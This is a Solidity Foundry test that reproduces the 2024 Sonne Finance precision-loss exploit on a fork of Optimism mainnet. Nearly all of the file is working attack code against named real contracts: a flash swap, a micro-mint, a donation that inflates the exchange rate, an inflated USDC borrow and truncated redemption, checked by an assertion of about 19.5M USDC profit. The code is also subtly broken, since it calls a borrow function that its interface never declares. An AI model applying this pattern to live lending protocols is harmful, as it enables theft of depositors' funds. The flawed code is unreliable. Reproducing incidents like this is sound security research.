// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

/**
 * @title  Sonne Finance – precision‑loss exploit (14‑May‑2024)
 * @author ImmuneBytes
 * @notice Reproduces Optimism tx 0x9312ae377d7ebdf3c7c3a86f80514878deb5df51aad38b6191d55db53e42b7f0.
 * @dev    Sequence: flash‑swap → micro‑mint → exchange‑rate inflation → borrow → redeem truncation → repay loan.
 * @see    NeptuneMutual, CertiK, Halborn post‑mortems for full timeline.
 */

// ‑‑‑‑‑‑‑‑‑‑ Interfaces (minimal, typed to what we call) ‑‑‑‑‑‑‑‑‑‑

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface ISoToken {
    function mint(uint256 mintAmount) external returns (uint256);
    function redeemUnderlying(uint256 amount) external returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
}

interface IVeloPair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

// ‑‑‑‑‑‑‑‑‑‑ Address book for Optimism main‑net ‑‑‑‑‑‑‑‑‑‑

library Addr {
    address internal constant VELO     = 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db;
    address internal constant USDC     = 0x7F5c764cBc14f9669B88837ca1490cCa17c31607;
    address internal constant soVELO   = 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5;
    address internal constant soUSDC   = 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F;
    address internal constant UNITROLLER = 0x60CF091cD3f50420d50fD7f707414d0DF4751C58;
    address internal constant VELO_POOL = 0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5; // USDC/VELO V2
}

// ‑‑‑‑‑‑‑‑‑‑ Exploit actors ‑‑‑‑‑‑‑‑‑‑

contract ExchangeRateWizard {
    using Addr for *;

    IERC20       private constant VELO = IERC20(Addr.VELO);
    ISoToken     private constant SO_VELO = ISoToken(Addr.soVELO);

    // Step 1: mint 2 wei soVELO (≈ 0.000000400000001 VELO)
    function mintTiny() external {
        VELO.approve(address(SO_VELO), type(uint256).max);
        SO_VELO.mint(400_000_001); // wei
    }

    // Step 2: donate all borrowed VELO to soVELO
    function donate() external {
        uint256 bal = VELO.balanceOf(address(this));
        VELO.transfer(address(SO_VELO), bal);
    }

    // Transfer helper for later
    function sweep(address token, address to) external {
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }
}

contract SonneExploitTest is Test {
    using Addr for *;

    IERC20   private constant VELO   = IERC20(Addr.VELO);
    IERC20   private constant USDC   = IERC20(Addr.USDC);
    ISoToken private constant SO_VELO = ISoToken(Addr.soVELO);
    ISoToken private constant SO_USDC = ISoToken(Addr.soUSDC);
    IComptroller private constant Unitroller = IComptroller(Addr.UNITROLLER);
    IVeloPair    private constant Pool = IVeloPair(Addr.VELO_POOL);

    ExchangeRateWizard private wizard;

    uint256 private constant FLASH_VELO = 35_469_150_965_253_049_864_450_449; // on‑chain value

    function setUp() public {
        // Fork Optimism one block before exploit.
        vm.createSelectFork("optimism", 120_062_492);
    }

    function test_exploit() public {
        wizard = new ExchangeRateWizard();

        // Initiate flash‑swap for VELO (amount1Out since VELO is token1).
        Pool.swap(0, FLASH_VELO, address(this), bytes("1"));

        // Profit assertion (≈ 20M USDC equivalent)
        uint256 profitUSDC = USDC.balanceOf(address(this));
        assertGt(profitUSDC, 19_500_000 * 1e6, "profit too low");
    }

    // Velodrome callback
    function hook(address /*sender*/, uint256 /*amount0*/, uint256 amount1, bytes calldata /*data*/) external {
        require(msg.sender == Addr.VELO_POOL, "only pool");

        // 1. Receive VELO; mint 2 wei soVELO
        VELO.transfer(address(wizard), amount1);
        wizard.mintTiny();

        // 2. Donate VELO to inflate exchangeRate
        wizard.donate();

        // 3. Use 2 wei soVELO as collateral to borrow USDC
        address[] memory mkts = new address[](2);
        mkts[0] = Addr.soUSDC;
        mkts[1] = Addr.soVELO;
        Unitroller.enterMarkets(mkts);

        // Borrow ≈ 7.7M USDC as on‑chain
        SO_USDC.borrow(768_947_220_961);

        // 4. Redeem VELO for 1 wei soVELO (redeemUnderlying handles truncation)
        SO_VELO.redeemUnderlying(amount1 - 1);

        // 5. Repay flash‑swap (VELO plus 0.05% fee)
        uint256 fee = (amount1 * 5) / 10000; // 0.05%
        VELO.transfer(address(Pool), amount1 + fee);
    }
}
